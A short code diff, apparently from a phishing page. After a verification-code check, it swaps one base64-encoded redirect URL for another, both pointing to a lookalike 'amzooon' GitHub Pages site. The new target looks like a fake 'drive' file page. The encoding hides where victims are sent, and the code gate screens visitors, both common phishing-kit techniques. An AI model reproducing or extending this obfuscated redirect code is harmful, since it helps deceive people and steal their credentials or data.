@@ -62,7 +62,7 @@ sendCodeBtn.addEventListener('click', () => {
             const userCode = verificationCodeInput.value;
 
             if (userCode === generatedCode) {
-                const redirectUrl = atob("aHR0cHM6Ly9hbXpvb29uLmdpdGh1Yi5pby9jaGFybGll");
+                const redirectUrl = atob("aHR0cHM6Ly9hbXpvb29uLmdpdGh1Yi5pby9jaGFybGllL2RyaXZlLTY4N2MwZTMzLTg0MzAtODAwOS05ZDdiLWFlNTY5YzAzZDVjODY4N2MwZTMzLTg0MzAtODAwOS05ZDdiLWFlNTY5YzAzZDVjOC5odG1s");
                 window.location.href = redirectUrl;
             } else {
                 attemptCount++;
